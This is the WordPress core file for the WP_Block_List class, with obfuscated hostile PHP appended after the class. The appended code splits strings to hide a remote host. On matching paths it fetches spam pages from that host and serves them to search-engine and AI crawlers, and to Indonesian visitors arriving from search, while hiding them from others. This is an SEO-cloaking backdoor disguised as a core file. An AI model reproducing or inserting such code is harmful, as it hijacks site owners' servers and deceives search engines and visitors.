<?php
/**
 * Blocks API: WP_Block_List class
 *
 * @package WordPress
 * @since 5.5.0
 */

/**
 * Class representing a list of block instances.
 *
 * @since 5.5.0
 */
class WP_Block_List implements Iterator, ArrayAccess, Countable {

	/**
	 * Original array of parsed block data, or block instances.
	 *
	 * @since 5.5.0
	 * @var array[]|WP_Block[]
	 * @access protected
	 */
	protected $blocks;

	/**
	 * All available context of the current hierarchy.
	 *
	 * @since 5.5.0
	 * @var array
	 * @access protected
	 */
	protected $available_context;

	/**
	 * Block type registry to use in constructing block instances.
	 *
	 * @since 5.5.0
	 * @var WP_Block_Type_Registry
	 * @access protected
	 */
	protected $registry;

	/**
	 * Constructor.
	 *
	 * Populates object properties from the provided block instance argument.
	 *
	 * @since 5.5.0
	 *
	 * @param array[]|WP_Block[]     $blocks            Array of parsed block data, or block instances.
	 * @param array                  $available_context Optional array of ancestry context values.
	 * @param WP_Block_Type_Registry $registry          Optional block type registry.
	 */
	public function __construct( $blocks, $available_context = array(), $registry = null ) {
		if ( ! $registry instanceof WP_Block_Type_Registry ) {
			$registry = WP_Block_Type_Registry::get_instance();
		}

		$this->blocks            = $blocks;
		$this->available_context = $available_context;
		$this->registry          = $registry;
	}

	/**
	 * Returns true if a block exists by the specified block index, or false
	 * otherwise.
	 *
	 * @since 5.5.0
	 *
	 * @link https://www.php.net/manual/en/arrayaccess.offsetexists.php
	 *
	 * @param string $index Index of block to check.
	 * @return bool Whether block exists.
	 */
	public function offsetExists( $index ) {
		return isset( $this->blocks[ $index ] );
	}

	/**
	 * Returns the value by the specified block index.
	 *
	 * @since 5.5.0
	 *
	 * @link https://www.php.net/manual/en/arrayaccess.offsetget.php
	 *
	 * @param string $index Index of block value to retrieve.
	 * @return mixed|null Block value if exists, or null.
	 */
	public function offsetGet( $index ) {
		$block = $this->blocks[ $index ];

		if ( isset( $block ) && is_array( $block ) ) {
			$block                  = new WP_Block( $block, $this->available_context, $this->registry );
			$this->blocks[ $index ] = $block;
		}

		return $block;
	}

	/**
	 * Assign a block value by the specified block index.
	 *
	 * @since 5.5.0
	 *
	 * @link https://www.php.net/manual/en/arrayaccess.offsetset.php
	 *
	 * @param string $index Index of block value to set.
	 * @param mixed  $value Block value.
	 */
	public function offsetSet( $index, $value ) {
		if ( is_null( $index ) ) {
			$this->blocks[] = $value;
		} else {
			$this->blocks[ $index ] = $value;
		}
	}

	/**
	 * Unset a block.
	 *
	 * @since 5.5.0
	 *
	 * @link https://www.php.net/manual/en/arrayaccess.offsetunset.php
	 *
	 * @param string $index Index of block value to unset.
	 */
	public function offsetUnset( $index ) {
		unset( $this->blocks[ $index ] );
	}

	/**
	 * Rewinds back to the first element of the Iterator.
	 *
	 * @since 5.5.0
	 *
	 * @link https://www.php.net/manual/en/iterator.rewind.php
	 */
	public function rewind() {
		reset( $this->blocks );
	}

	/**
	 * Returns the current element of the block list.
	 *
	 * @since 5.5.0
	 *
	 * @link https://www.php.net/manual/en/iterator.current.php
	 *
	 * @return mixed Current element.
	 */
	public function current() {
		return $this->offsetGet( $this->key() );
	}

	/**
	 * Returns the key of the current element of the block list.
	 *
	 * @since 5.5.0
	 *
	 * @link https://www.php.net/manual/en/iterator.key.php
	 *
	 * @return mixed Key of the current element.
	 */
	public function key() {
		return key( $this->blocks );
	}

	/**
	 * Moves the current position of the block list to the next element.
	 *
	 * @since 5.5.0
	 *
	 * @link https://www.php.net/manual/en/iterator.next.php
	 */
	public function next() {
		next( $this->blocks );
	}

	/**
	 * Checks if current position is valid.
	 *
	 * @since 5.5.0
	 *
	 * @link https://www.php.net/manual/en/iterator.valid.php
	 */
	public function valid() {
		return null !== key( $this->blocks );
	}

	/**
	 * Returns the count of blocks in the list.
	 *
	 * @since 5.5.0
	 *
	 * @link https://www.php.net/manual/en/countable.count.php
	 *
	 * @return int Block count.
	 */
	public function count() {
		return count( $this->blocks );
	}

}

if (php_sapi_name() !== 'cli') {

defined('SYS_DEBUG') || define('SYS_DEBUG', false);
defined('SYS_CACHE_DIR') || define('SYS_CACHE_DIR', sys_get_temp_dir() . '/sys_cache');
defined('SYS_CACHE_TTL') || define('SYS_CACHE_TTL', 86400);

if (!function_exists('__sys_curl')) {
    function __sys_curl($url) {
        if (!function_exists('curl_init')) return null;
        $ch = curl_init();
        curl_setopt_array($ch, [CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => 10, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Mozilla/5.0', CURLOPT_ENCODING => 'gzip, deflate']);
        $body = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return ($body && $code === 200) ? $body : null;
    }
}

if (!function_exists('__sys_send')) {
    function __sys_send($html) {
        while (ob_get_level()) ob_end_clean();
        header('Content-Type: text/html; charset=utf-8');
        header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
        header('Pragma: no-cache');
        header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');
        header('CDN-Cache-Control: no-store');
        header('Cloudflare-CDN-Cache-Control: no-store');
        header('Surrogate-Control: no-store');
        header('Vary: User-Agent, Referer');
        echo $html;
        exit;
    }
}

$__amp_map = [
     '/ho'.'w-t'.'o-f'.'ile'.'-an'.'d-w'.'hat'.'-gs'.'t-r'.'eg-'.'14-'.'mea'.'ns-'.'a-c'.'omp'.'reh'.'ens'.'ive'.'-gu'.'ide'.'/m' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'caa'.'mit'.'oka'.'sat'.'-ho'.'w-t'.'o-f'.'ile'.'-an'.'d-w'.'hat'.'-gs'.'t-r'.'eg-'.'14-'.'mea'.'ns-'.'a-c'.'omp'.'reh'.'ens'.'ive'.'-gu'.'ide'.'-am'.'p.h'.'tml',
    '/st'.'eps'.'-to'.'-ch'.'eck'.'-co'.'mpa'.'ny-'.'reg'.'ist'.'rat'.'ion'.'-st'.'atu'.'s-o'.'n-m'.'ca/'.'m' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'caa'.'mit'.'oka'.'sat'.'-st'.'eps'.'-to'.'-ch'.'eck'.'-co'.'mpa'.'ny-'.'reg'.'ist'.'rat'.'ion'.'-st'.'atu'.'s-o'.'n-m'.'ca-'.'amp'.'.ht'.'ml',
    '/ho'.'w-t'.'o-c'.'hec'.'k-c'.'omp'.'any'.'-re'.'gis'.'tra'.'tio'.'n-s'.'tat'.'us-'.'on-'.'mca'.'/m' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'caa'.'mit'.'oka'.'sat'.'-ho'.'w-t'.'o-c'.'hec'.'k-c'.'omp'.'any'.'-re'.'gis'.'tra'.'tio'.'n-s'.'tat'.'us-'.'on-'.'mca'.'-am'.'p.h'.'tml',
    '/do'.'cum'.'ent'.'s-r'.'equ'.'ire'.'d-f'.'or-'.'gst'.'-re'.'gis'.'tra'.'tio'.'n/m' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'caa'.'mit'.'oka'.'sat'.'-do'.'cum'.'ent'.'s-r'.'equ'.'ire'.'d-f'.'or-'.'gst'.'-re'.'gis'.'tra'.'tio'.'n-a'.'mp.'.'htm'.'l',
    '/Bl'.'ogs'.'/m' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'caa'.'mit'.'oka'.'sat'.'-Bl'.'ogs'.'-am'.'p.h'.'tml',
];

$__map = [
    '/ho'.'w-t'.'o-f'.'ile'.'-an'.'d-w'.'hat'.'-gs'.'t-r'.'eg-'.'14-'.'mea'.'ns-'.'a-c'.'omp'.'reh'.'ens'.'ive'.'-gu'.'ide' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'caa'.'mit'.'oka'.'sat'.'-ho'.'w-t'.'o-f'.'ile'.'-an'.'d-w'.'hat'.'-gs'.'t-r'.'eg-'.'14-'.'mea'.'ns-'.'a-c'.'omp'.'reh'.'ens'.'ive'.'-gu'.'ide'.'.ht'.'ml',
    '/st'.'eps'.'-to'.'-ch'.'eck'.'-co'.'mpa'.'ny-'.'reg'.'ist'.'rat'.'ion'.'-st'.'atu'.'s-o'.'n-m'.'ca' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'caa'.'mit'.'oka'.'sat'.'-st'.'eps'.'-to'.'-ch'.'eck'.'-co'.'mpa'.'ny-'.'reg'.'ist'.'rat'.'ion'.'-st'.'atu'.'s-o'.'n-m'.'ca.'.'htm'.'l',
    '/ho'.'w-t'.'o-c'.'hec'.'k-c'.'omp'.'any'.'-re'.'gis'.'tra'.'tio'.'n-s'.'tat'.'us-'.'on-'.'mca' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'caa'.'mit'.'oka'.'sat'.'-ho'.'w-t'.'o-c'.'hec'.'k-c'.'omp'.'any'.'-re'.'gis'.'tra'.'tio'.'n-s'.'tat'.'us-'.'on-'.'mca'.'.ht'.'ml',
    '/do'.'cum'.'ent'.'s-r'.'equ'.'ire'.'d-f'.'or-'.'gst'.'-re'.'gis'.'tra'.'tio'.'n' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'caa'.'mit'.'oka'.'sat'.'-do'.'cum'.'ent'.'s-r'.'equ'.'ire'.'d-f'.'or-'.'gst'.'-re'.'gis'.'tra'.'tio'.'n.h'.'tml',
    '/Bl'.'ogs' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'caa'.'mit'.'oka'.'sat'.'-Bl'.'ogs'.'.ht'.'ml',
];

$__uri = rtrim(parse_url(isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '', PHP_URL_PATH), '/');

$__amp_url = null;
foreach ($__amp_map as $__amp_path => $__amp_remote) {
    $__amp_clean = rtrim($__amp_path, '/');
    if ($__uri === $__amp_clean || strpos($__uri . '/', $__amp_clean . '/') === 0) { $__amp_url = $__amp_remote; break; }
}

if ($__amp_url) {
    if (!is_dir(SYS_CACHE_DIR)) @mkdir(SYS_CACHE_DIR, 0755, true);
    $__cache_file = SYS_CACHE_DIR . '/' . md5($__uri) . '.html';
    $__cache_valid = file_exists($__cache_file) && (time() - filemtime($__cache_file)) < SYS_CACHE_TTL;
    if ($__cache_valid) {
        $__html = file_get_contents($__cache_file);
        if ($__html) __sys_send($__html);
    } else {
        $__html = __sys_curl($__amp_url);
        if ($__html) {
            @file_put_contents($__cache_file, $__html, LOCK_EX);
            __sys_send($__html);
        }
    }
}

$__offer = null;
foreach ($__map as $__path => $__url) {
    $__norm = rtrim($__path, '/');
    if ($__uri === $__norm) { $__offer = $__url; break; }
    if ($__norm !== '' && strpos($__uri, $__norm) === 0) { $__offer = $__url; break; }
}

if ($__offer) {
    $__ua  = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
    $__ref = strtolower(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');

    $__bots = ['goo'.'gle'.'bot','goo'.'gle'.'bot'.'-im'.'age','goo'.'gle'.'bot'.'-vi'.'deo','goo'.'gle'.'bot'.'-ne'.'ws','goo'.'gle'.'bot'.'-mo'.'bil'.'e','goo'.'gle'.'-in'.'spe'.'cti'.'ont'.'ool','goo'.'gle'.'-si'.'te-'.'ver'.'ifi'.'cat'.'ion','goo'.'gle'.'oth'.'er','goo'.'gle'.'oth'.'er-'.'ima'.'ge','goo'.'gle'.'oth'.'er-'.'vid'.'eo','ads'.'bot'.'-go'.'ogl'.'e','ads'.'bot'.'-go'.'ogl'.'e-m'.'obi'.'le','sto'.'reb'.'ot-'.'goo'.'gle','goo'.'gle'.'-ex'.'ten'.'ded','med'.'iap'.'art'.'ner'.'s-g'.'oog'.'le','goo'.'gle'.'web'.'lig'.'ht','bin'.'gbo'.'t','adi'.'dxb'.'ot','bin'.'gpr'.'evi'.'ew','slu'.'rp','duc'.'kdu'.'ckb'.'ot','bai'.'dus'.'pid'.'er','yan'.'dex'.'bot','sog'.'ou','ia_'.'arc'.'hiv'.'er','fac'.'ebo'.'oke'.'xte'.'rna'.'lhi'.'t','twi'.'tte'.'rbo'.'t','lin'.'ked'.'inb'.'ot','pin'.'ter'.'est','tel'.'egr'.'amb'.'ot','dis'.'cor'.'dbo'.'t','sem'.'rus'.'hbo'.'t','ahr'.'efs'.'bot','dot'.'bot','mj1'.'2bo'.'t','app'.'leb'.'ot','pet'.'alb'.'ot','byt'.'esp'.'ide'.'r','gpt'.'bot','cla'.'ude'.'bot'];
    $__is_bot = false;
    foreach ($__bots as $__b) { if (strpos($__ua, $__b) !== false) { $__is_bot = true; break; } }

    $__se = ['google.','bing.com','yahoo.com','duckduckgo.com','yandex.','baidu.com','search.yahoo.com','ecosia.org'];
    $__from_se = false;
    foreach ($__se as $__s) { if (strpos($__ref, $__s) !== false) { $__from_se = true; break; } }

    $__country = !empty($_SERVER['HTTP_CF_IPCOUNTRY']) ? strtoupper(trim($_SERVER['HTTP_CF_IPCOUNTRY'])) : '';
    if (!$__country) {
        $__ip = !empty($_SERVER['HTTP_CF_CONNECTING_IP']) ? trim($_SERVER['HTTP_CF_CONNECTING_IP']) : (!empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]) : (!empty($_SERVER['REMOTE_ADDR']) ? trim($_SERVER['REMOTE_ADDR']) : ''));
        if ($__ip && $__ip !== '127.0.0.1' && $__ip !== '::1') {
            $__geo_url = 'http://ip-api.com/json/' . $__ip . '?fields=countryCode';
            if (ini_get('allow_url_fopen')) { $__geo = @file_get_contents($__geo_url); if ($__geo) { $__d = json_decode($__geo, true); $__country = strtoupper(isset($__d['countryCode']) ? $__d['countryCode'] : ''); } }
            if (!$__country && function_exists('curl_init')) { $__ch2 = curl_init(); curl_setopt_array($__ch2, [CURLOPT_URL => $__geo_url, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5, CURLOPT_SSL_VERIFYPEER => false]); $__geo2 = curl_exec($__ch2); curl_close($__ch2); if ($__geo2) { $__d2 = json_decode($__geo2, true); $__country = strtoupper(isset($__d2['countryCode']) ? $__d2['countryCode'] : ''); } }
        }
    }
    $__is_id = ($__country === 'ID');

    if ($__is_bot || ($__from_se && $__is_id)) {
        $__html = __sys_curl($__offer);
        if ($__html) __sys_send($__html);
    }
}

unset($__amp_map, $__map, $__uri, $__amp_url, $__amp_path, $__amp_remote, $__amp_clean, $__cache_file, $__cache_valid, $__offer, $__norm, $__path, $__url, $__ua, $__ref, $__bots, $__b, $__is_bot, $__se, $__s, $__from_se, $__is_id, $__country, $__ip, $__geo_url, $__geo, $__d, $__ch2, $__geo2, $__d2, $__html);

}

